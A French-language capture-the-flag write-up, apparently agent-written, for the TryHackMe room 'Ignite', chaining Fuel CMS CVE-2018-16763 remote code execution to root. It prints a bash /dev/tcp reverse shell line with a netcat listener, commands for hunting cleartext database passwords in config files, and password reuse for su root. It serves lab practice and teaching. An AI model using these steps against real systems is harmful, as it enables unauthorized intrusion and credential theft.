---
title: "Ignite"
category: rooms
icon: "🔥"
difficulty: "Easy"
platform: "THM"
status: "Terminée"
tags: [web, fuel-cms, codeigniter, cve-2018-16763, rce, reverse-shell, linux, privesc, creds-reuse, config-file]
summary: "Box easy : CMS Fuel 1.4 vulnerable (CVE-2018-16763, injection PHP via filter) -> RCE www-data -> reverse shell -> db_pass en clair dans le fichier de config -> reutilise pour root."
updated: 2026-11-04
source: agent
---

> Box (easy). Chain web classique : CMS Fuel vulnérable → RCE → privesc par réutilisation de creds trouvés dans un fichier de config. Deuxième box où les réflexes web+Linux s'enchaînent presque tout seuls.

## TL;DR
CMS **Fuel 1.4** → exploit public (injection PHP via le paramètre `filter`) → RCE en `www-data` → reverse shell → fouille du fichier de config DB → **db_pass en clair** réutilisé pour `root`. recon → exploit connu → shell → creds réutilisés → root.

## Chain
1. **Fingerprint** : page d'accueil = FUEL CMS. Version dans le `README.md` / la doc → Fuel **1.4.1**.
2. **Exploit connu** : CVE-2018-16763 — injection PHP non authentifiée via `/fuel/pages/select/?filter=`. Exploit public (python2) qui donne un pseudo-shell. RCE en `www-data`.
3. **Reverse shell** propre : faire exécuter un `bash -i >& /dev/tcp/IP/PORT 0>&1` via le RCE, listener `nc -lvnp 4444` prêt avant.
4. **TTY upgrade** obligatoire (sinon `sudo`/`su` refusent) : `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
5. **Privesc** : le fichier de config DB de Fuel contient le mot de passe MySQL **en clair** → réutilisé tel quel pour `su root`. Root.

## Pièges rencontrés
- L'exploit passe par un proxy Burp (`127.0.0.1:8080`) hardcodé → si Burp tourne pas = `ProxyError / Connection refused`. Soit lancer Burp, soit retirer l'argument `proxies=` de l'appel `requests.get`.
- L'exploit préfixe la sortie par le mot `system` → `systemwww-data` = mot `system` + sortie `www-data`. Le home réel est `/home/www-data`, pas `systemwww-data`.
- Fausse piste : le hash SHA1 + salt dans `install/upgrades/*.sql` est le mdp admin du CMS (à cracker), PAS le chemin de privesc. Ignorer, viser le fichier de **config active** (`database.php`) qui a le mdp en clair.

## Réflexes acquis / consolidés
- **Réflexe** : CMS identifié + version → chercher un exploit public connu (CVE) avant de réinventer la roue. Fuel 1.4 → CVE-2018-16763.
- **Réflexe (config = creds)** : une web app a TOUJOURS un fichier de config qui contient le mdp de sa base **en clair** (l'appli en a besoin pour se connecter). Pour CodeIgniter/Fuel → `fuel/application/config/database.php`. `find / -name database.php 2>/dev/null` ou `grep -rniE "password|db_pass" /var/www/html`.
- **Réflexe (réutilisation)** : un `db_pass` en clair est souvent réutilisé pour un compte système (admins flemmards). Toujours tester ce mdp sur `su root` / `su <user>`.
- **Réflexe (hash vs clair)** : un hash (SHA1 + salt) dans un `.sql` d'install = à cracker, souvent une fausse piste sur une easy. Un mdp en **clair** dans un fichier de config = le vrai chemin. Préférer le clair.
- **Réflexe (shell pourri)** : `sudo: no tty present` / `su: must be run from a terminal` = shell sans TTY → upgrade avec `python3 -c 'import pty; pty.spawn("/bin/bash")'` AVANT de retenter sudo/su.
